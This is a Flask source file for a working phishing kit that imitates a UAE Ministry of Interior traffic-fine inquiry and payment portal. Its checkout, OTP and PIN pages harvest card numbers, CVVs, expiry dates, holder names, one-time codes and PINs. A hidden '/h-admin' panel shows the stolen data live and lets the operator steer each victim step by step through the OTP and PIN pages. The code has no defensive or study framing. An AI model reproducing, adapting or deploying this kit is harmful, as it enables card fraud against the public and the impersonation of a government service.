import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

db = {"sessions": {}, "status": "waiting", "msg": ""}

# --- الهيدر الرسمي الثابت (تصميم عريض) ---
MOI_TOP_BAR = '''
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<div style="background:white; padding:20px 30px; border-bottom:1px solid #eee; display:flex; justify-content:space-between; align-items:center; font-family:sans-serif;">
    <div style="display:flex; align-items:center; gap:25px; color:#555; font-size:20px;">
        <span style="font-weight:bold; color:#333; cursor:pointer;">EN | دخول</span>
        <i class="fa fa-info-circle"></i><i class="fa fa-volume-up"></i><i class="fa fa-question-circle"></i>
    </div>
    <div style="display:flex; gap:15px;">
        <div style="background:#b0914f; color:white; padding:12px 20px; border-radius:6px; font-size:20px;"><i class="fa fa-bars"></i></div>
    </div>
</div>
<div style="background:white; text-align:center; padding:20px 0; border-bottom:3px solid #b0914f;">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; max-width:800px;">
</div>
'''

# --- 1. الصفحة الرئيسية ---
@app.route('/')
def index():
    return render_template_string(f"""
    <html lang="ar" dir="rtl"><body style="margin:0; font-family:sans-serif;">
        {MOI_TOP_BAR}
        <div style="max-width:1000px; margin:0 auto; position:relative;">
            <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg" style="width:100%;">
            <button onclick="location.href='/search'" style="position:absolute; top:350px; left:10%; width:80%; height:100px; background:transparent; border:none; cursor:pointer;"></button>
        </div>
    </body></html>
    """)

# --- 2. صفحة الاستعلام (التبويبات الشغالة + التصميم الرسمي) ---
@app.route('/search')
def search():
    return render_template_string(f"""
    <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><style>
        body{{background:#f7f8fa; margin:0; font-family:sans-serif;}}
        .main-card{{background:white; width:95%; max-width:900px; margin:40px auto; border-top:8px solid #b0914f; padding:40px; box-shadow:0 10px 30px rgba(0,0,0,0.08); border-radius:0 0 15px 15px;}}
        .tabs-container{{display:flex; justify-content:center; gap:10px; margin-bottom:30px; border-bottom:1px solid #ddd; padding-bottom:15px;}}
        .tab-btn{{padding:15px 25px; border:1px solid #ddd; background:#f9f9f9; cursor:pointer; font-weight:bold; font-size:16px; border-radius:8px; transition:0.3s; color:#666; flex:1; text-align:center;}}
        .tab-btn.active{{background:#b0914f; color:white; border-color:#b0914f;}}
        label{{display:block; margin:15px 0 8px; font-weight:bold; color:#333; font-size:18px;}}
        select, input{{width:100%; padding:20px; border:1px solid #ccc; border-radius:8px; margin-bottom:20px; font-size:18px; outline:none; background:#fafafa; box-sizing:border-box;}}
        .btn-search{{width:100%; padding:25px; background:#b0914f; color:white; border:none; font-size:22px; font-weight:bold; cursor:pointer; border-radius:8px;}}
        .content-section{{display:none;}} .content-section.active{{display:block;}}
    </style></head>
    <body>{MOI_TOP_BAR}
        <div class="main-card">
            <div class="tabs-container">
                <div class="tab-btn active" onclick="openTab(event, 'plate-tab')">بيانات اللوحة</div>
                <div class="tab-btn" onclick="openTab(event, 'tc-tab')">الرمز المروري (T.C)</div>
                <div class="tab-btn" onclick="openTab(event, 'license-tab')">بيانات الرخصة</div>
            </div>
            <div id="plate-tab" class="content-section active">
                <label>الإمارة</label>
                <select><option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option><option>عجمان / Ajman</option></select>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
                    <div><label>مصدر اللوحة</label><select><option>خصوصي / Private</option><option>تجاري</option></select></div>
                    <div><label>فئة اللوحة</label><input placeholder="1"></div>
                </div>
                <label>رقم اللوحة</label><input placeholder="12345">
            </div>
            <div id="tc-tab" class="content-section">
                <label>الرمز المروري (Traffic Code Number)</label>
                <input placeholder="أدخل الرمز المكون من 8 أرقام">
            </div>
            <div id="license-tab" class="content-section">
                <label>مصدر الرخصة</label><select><option>أبوظبي</option><option>دبي</option></select>
                <label>رقم الرخصة</label><input placeholder="رقم رخصة القيادة">
            </div>
            <button onclick="location.href='/checkout'" class="btn-search">بدء عملية الاستعلام</button>
        </div>
        <script>
            function openTab(evt, tabId) {{
                let sections = document.getElementsByClassName("content-section");
                for (let i=0; i<sections.length; i++) {{ sections[i].classList.remove("active"); }}
                let tabs = document.getElementsByClassName("tab-btn");
                for (let i=0; i<tabs.length; i++) {{ tabs[i].classList.remove("active"); }}
                document.getElementById(tabId).classList.add("active");
                evt.currentTarget.classList.add("active");
            }}
        </script>
    </body></html>
    """)

# --- 3. صفحة الدفع (كبيرة + فحص الفيزا) ---
@app.route('/checkout')
def checkout():
    return render_template_string(f"""
    <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><style>
        body{{background:#f4f6f8; font-family:sans-serif; margin:0;}}
        .pay-container{{max-width:850px; margin:40px auto; padding:20px;}}
        .pay-box{{background:white; border-radius:20px; box-shadow:0 15px 40px rgba(0,0,0,0.1); padding:50px;}}
        .v-header{{background:#b0914f; color:white; padding:25px; border-radius:15px 15px 0 0; text-align:center; margin:-50px -50px 40px -50px; font-size:24px; font-weight:bold;}}
        input, select{{width:100%; padding:22px; margin-bottom:25px; border:1.5px solid #ddd; border-radius:12px; outline:none; font-size:20px; box-sizing:border-box;}}
        .btn-pay{{width:100%; padding:25px; background:#b0914f; color:white; border:none; border-radius:12px; font-size:24px; font-weight:bold; cursor:pointer;}}
        .card-logos img{{height:40px; margin:0 15px; opacity:0.3; transition:0.3s;}}
        .active-logo{{opacity:1 !important; transform:scale(1.2);}}
    </style></head>
    <body>{MOI_TOP_BAR}
        <div class="pay-container">
            <div class="pay-box">
                <div class="v-header">بوابة دفع المخالفات الموحدة - 2026</div>
                <div class="card-logos" style="text-align:center; margin-bottom:30px;">
                    <img id="v-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png">
                    <img id="m-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png">
                </div>
                <form action="/submit-card" method="POST">
                    <input name="card" id="c_num" placeholder="رقم البطاقة" maxlength="19" required>
                    <div style="display:flex; gap:20px;">
                        <select name="exp_m" required>
                            <option value="">الشهر</option>{% for m in range(1, 13) %}<option>{{"%02d"|format(m)}}</option>{% endfor %}
                        </select>
                        <select name="exp_y" required>
                            <option value="">السنة</option>{% for y in range(2026, 2037) %}<option>{{y}}</option>{% endfor %}
                        </select>
                    </div>
                    <div style="display:flex; gap:20px;">
                        <input name="cvv" placeholder="CVV" maxlength="3" style="flex:1;" required>
                        <input name="holder" placeholder="اسم حامل البطاقة" style="flex:3;" required>
                    </div>
                    <button type="submit" class="btn-pay">دفع المبلغ المستحق</button>
                </form>
            </div>
        </div>
        <script>
            const cin = document.getElementById('c_num');
            cin.addEventListener('input', e => {{
                let v = e.target.value.replace(/\\s/g, '');
                document.getElementById('v-logo').className = v.startsWith('4') ? 'active-logo' : '';
                document.getElementById('m-logo').className = v.startsWith('5') ? 'active-logo' : '';
                e.target.value = v.replace(/(.{{4}})/g, '$1 ').trim();
            }});
        </script>
    </body></html>
    """)

# --- 4. صفحات OTP و PIN (عملاقة) ---
PAGE_CSS = """<style>
    body{margin:0; background:#f0f2f5; font-family:sans-serif; display:flex; flex-direction:column; min-height:100vh;}
    .wrap{flex:1; display:flex; justify-content:center; align-items:center; padding:20px;}
    .modal-big{background:white; width:100%; max-width:700px; padding:80px; border-radius:25px; box-shadow:0 30px 60px rgba(0,0,0,0.15); text-align:center; border-top:10px solid #b0914f;}
    input{width:100%; padding:30px; font-size:50px; text-align:center; border:3px solid #eee; border-radius:20px; margin-bottom:40px; letter-spacing:15px; font-weight:bold; outline:none;}
    .btn-big{width:100%; padding:30px; background:#b0914f; color:white; border:none; border-radius:20px; font-size:28px; font-weight:bold; cursor:pointer;}
</style>"""

@app.route('/otp')
def otp(): return render_template_string(f"<html><head>{PAGE_CSS}</head><body>{MOI_TOP_BAR}<div class='wrap'><div class='modal-big'><h1>تأكيد OTP</h1><p>أدخل الرمز المرسل لهاتفك</p><form action='/submit-card' method='POST'><input name='otp' maxlength='6' required autofocus><button class='btn-big'>تأكيد السداد</button></form></div></div></body></html>")

@app.route('/pin')
def pin(): return render_template_string(f"<html><head>{PAGE_CSS}</head><body>{MOI_TOP_BAR}<div class='wrap'><div class='modal-big'><h1>الرقم السري (PIN)</h1><p>أدخل الرقم السري للبطاقة</p><form action='/submit-card' method='POST'><input name='pin' type='password' maxlength='4' required autofocus><button class='btn-big'>إرسال</button></form></div></div></body></html>")

# --- 5. لوحة التحكم (VIP) ---
@app.route('/h-admin')
def admin():
    return render_template_string("""
    <html lang="ar" dir="rtl"><head><style>
        body{background:#000; color:#fff; font-family:sans-serif; padding:30px;}
        .card-ui {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            width:450px; height:260px; border-radius:20px; padding:30px; position:relative; margin:20px; display:inline-block;
        }
        .c-num{font-size:30px; letter-spacing:4px; margin-top:70px;}
        .admin-panel{background:#111; padding:20px; border-radius:0 0 20px 20px; width:470px; margin-left:20px; margin-top:-25px; border:1px solid #333;}
        .btn-act{padding:15px; border:none; border-radius:10px; cursor:pointer; font-weight:bold; width:48%; margin:1%;}
    </style></head>
    <body>
        <h1>لوحة تحكم 2026 👮‍♂️</h1>
        <div id="logs"></div>
        <script>
            function refresh(){
                fetch('/get-logs').then(r=>r.json()).then(data=>{
                    let h = '';
                    for(let id in data.sessions){
                        let s = data.sessions[id];
                        h += `<div>
                            <div class="card-ui">
                                <div style="position:absolute; top:30px; right:30px;">CVV: ${s.cvv}</div>
                                <div class="c-num">${s.card}</div>
                                <div style="margin-top:30px;">${s.holder}</div>
                                <div style="position:absolute; bottom:30px; right:30px;">${s.exp_m}/${s.exp_y}</div>
                            </div>
                            <div class="admin-panel">
                                <div style="color:#0f0; font-size:24px; text-align:center;">OTP: ${s.otp || '---'} | PIN: ${s.pin || '---'}</div>
                                <button class="btn-act" style="background:#27ae60; color:#fff;" onclick="act('go_otp')">طلب OTP</button>
                                <button class="btn-act" style="background:#2980b9; color:#fff;" onclick="act('go_pin')">طلب PIN</button>
                            </div>
                        </div>`;
                    }
                    document.getElementById('logs').innerHTML = h;
                });
            }
            function act(st, msg=''){ fetch('/set-status/'+st+'?msg='+msg); }
            setInterval(refresh, 2000); refresh();
        </script>
    </body></html>
    """)

@app.route('/submit-card', methods=['POST'])
def sub():
    c = request.form.get('card') or "CARD"
    if c not in db['sessions']: db['sessions'][c] = request.form.to_dict()
    else: db['sessions'][c].update(request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_JS)

@app.route('/get-logs')
def get_logs(): return jsonify({"sessions": db['sessions']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; db['msg'] = request.args.get('msg', ''); return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status'], "msg": db['msg']})

WAIT_JS = """<script>setInterval(()=>{fetch('/check-status').then(r=>r.json()).then(d=>{if(d.status==='go_otp')location.href='/otp';if(d.status==='go_pin')location.href='/pin';if(d.status==='error_card'){alert(d.msg);location.href='/checkout';}});},2000);</script><body style="text-align:center;padding-top:200px;font-family:sans-serif;background:#f8f9fa;"><h2>جاري معالجة الطلب...</h2></body>"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
